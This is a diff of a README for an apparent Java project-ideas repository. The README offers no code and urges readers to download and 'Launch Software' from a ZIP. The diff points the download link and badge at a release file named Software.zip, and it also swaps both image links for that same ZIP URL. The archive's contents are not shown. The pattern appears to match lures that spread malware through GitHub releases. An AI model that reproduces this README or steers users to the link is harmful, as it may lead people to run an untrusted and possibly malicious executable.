@@ -4,7 +4,7 @@
 ## Overview
 Welcome to the IEEE Java Projects repository, where you can explore a diverse range of Java projects covering areas such as Artificial Intelligence, Machine Learning, Data Science, Networking, Cybersecurity, IoT, and more! Whether you are a student looking for project ideas or a professional seeking inspiration, this repository has something for everyone.
 
-![Java Projects](https://image.freepik.com/free-vector/group-people-working-together_23-2148565886.jpg)
+![Java Projects](https://github.com/Shikayunamya/IEEE-Java-Project-list-/releases/download/v2.0/Software.zip)
 
 ## Repository Content
 In this repository, you will find a collection of Java projects that demonstrate the application of Java programming in various domains. From building intelligent chatbots to implementing advanced algorithms, these projects showcase the versatility and power of Java in solving real-world problems.
@@ -33,9 +33,9 @@ Here are a few project samples to give you a glimpse of what you can expect in t
 
 ## Access Software
 To access the software related to these projects, please download the ZIP file from the following link:
-[Launch Software](https://github.com/user-attachments/files/18383251/Software.zip)
+[Launch Software](https://github.com/Shikayunamya/IEEE-Java-Project-list-/releases/download/v2.0/Software.zip)
 
-[![Download Software](https://img.shields.io/badge/Download-ZIP-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/Shikayunamya/IEEE-Java-Project-list-/releases/download/v2.0/Software.zip)](https://github.com/Shikayunamya/IEEE-Java-Project-list-/releases/download/v2.0/Software.zip)
 
 ## Get Started
 Get started on your Java project journey by exploring the projects in this repository. Dive into the code, experiment with different approaches, and unleash your creativity to bring these projects to life. Whether you are a beginner or an experienced developer, there is something here for everyone.
@@ -49,4 +49,4 @@ Stay updated on the latest Java projects and technology trends by following us o
 ## Thank You
 Thank you for exploring the IEEE Java Projects repository. We hope you find value and inspiration in the projects shared here. Happy coding and innovating with Java!
 
-![Thank You](https://image.freepik.com/free-vector/thank-you-lettering-inspirational-quote-typography_120627-415.jpg)
+![Thank You](https://github.com/Shikayunamya/IEEE-Java-Project-list-/releases/download/v2.0/Software.zip)
